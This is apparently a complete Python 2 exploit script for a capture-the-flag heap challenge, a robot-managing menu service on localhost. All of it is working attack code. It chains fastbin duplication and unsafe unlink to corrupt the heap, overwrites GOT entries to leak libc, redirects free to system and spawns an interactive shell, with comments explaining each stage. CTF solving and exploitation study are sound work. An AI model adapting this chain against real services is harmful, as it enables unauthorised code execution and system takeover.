import time
# https://github.com/niklasb/ctf-tools/blob/master/pwnlib/tools.py
from pwnlib.tools import *

TARGET=('localhost',5000)
INTERVAL=0

offset_free = 549184
offset_system = 0x456d0

p64 = pack64
p32 = pack

def ru(st):
    return read_until(s, st)

def add(rob, arg=0):
    ru('choice : ')
    s.sendall('1\n')
    ru('choice :')
    s.sendall('%d\n' % rob)
    if rob == 2:
        ru('intelligence: ')
        s.sendall('%d\n' % arg)
    elif rob == 3:
        ru('cruelty: ')
        s.sendall('%d\n' % arg)
    elif rob == 6:
        ru('powerful: ')
        s.sendall('%d\n' % arg)

def rem(rob):
    ru('choice : ')
    s.sendall('2\n')
    ru('choice :')
    s.sendall('%d\n' % rob)

def overflow_tag(bit, data='9999'):
    ru('choice : ')
    s.sendall('1\n')
    ru('choice :')
    assert len(data) == 4
    s.sendall(data + chr(bit))

def change_name(rob, data):
    ru('choice : ')
    s.sendall('3\n')
    ru('choice :')
    s.sendall('%d\n' % rob)
    ru('name: \n')
    time.sleep(INTERVAL)
    s.sendall(data)


s = socket.create_connection(TARGET)

# As a first step, we use the technique described in
# https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c
# to allocate a fastbin at 0x603148 (where the destructor power is stored)
#
# Then we allocate the destructor robot at the beginning of the heap and overwrite
# the power, to get a full overwrite of the heap so we can use the unsafe unlink
# technique
# https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c
#
# From there it's game over, since we can control a robot's buffer pointer

# we are now creating a fake fastbin chunk @ 0x603138
# write size 0x20 to 0x603140
add(3, 0x20)
# deallocate again because we can have at most 3 robots
rem(3)

add(2, 1)
rem(2)
overflow_tag(1)
# point free list pointer to 0x603138
change_name(2, p32(0x603138))
overflow_tag(0)
add(2, 1)

# now calloc returns 0x603148 as name of robot 1
add(1)

# clean up to make space for robots
rem(2)
rem(3)

# unsafe unlink
add(3,7)
add(4)
rem(3)
add(6,1)

# increase destructor buffer size so we can overwrite the heap
change_name(1, p32(0x1000))
change_name(6,
    "a"*0x10 +
    p64(0x6030e8 - 0x18) + p64(0x6030e8 - 0x10) + p64(0) + p64(0) +
    "b"*0x80 +
    p64(0xb0)
    )
# consolidate backward, thereby unlinking the fake chunk
rem(4)
# after this, robot 1's buffer points to the pointer for robot 6's buffer
change_name(6, "A"*40 + p64(0x6030e8))

def write(where, what):
    change_name(1, p64(where))
    change_name(6, what)

ret = 0x4015BC

# make exit() a nop
write(0x603098, p64(ret))
# set counter to 3
write(0x603130, p64(3))

# leak address of free
free_got = 0x603018
change_name(1, p64(free_got))
while True:
    ru('choice : ')
    s.sendall('4\n')
    buf = ru(lambda st: '!! Thx ' in st or 'Robot Hell' in st)
    if '!! Thx' in buf:
        break
    else:
        print 'Retrying...'

libc = unpack64(s.recv(6) + '\0\0') - offset_free
print '[*] libc @ %016x' % libc

# free = system now
write(free_got, p64(libc + offset_system))

# write sh at expendable space in BSS
change_name(1, p64(0x603114))
change_name(6, "sh\0")
# trigger system("sh")
rem(6)

print '[*] Pwned. Enjoy your shell!'
interact(s)
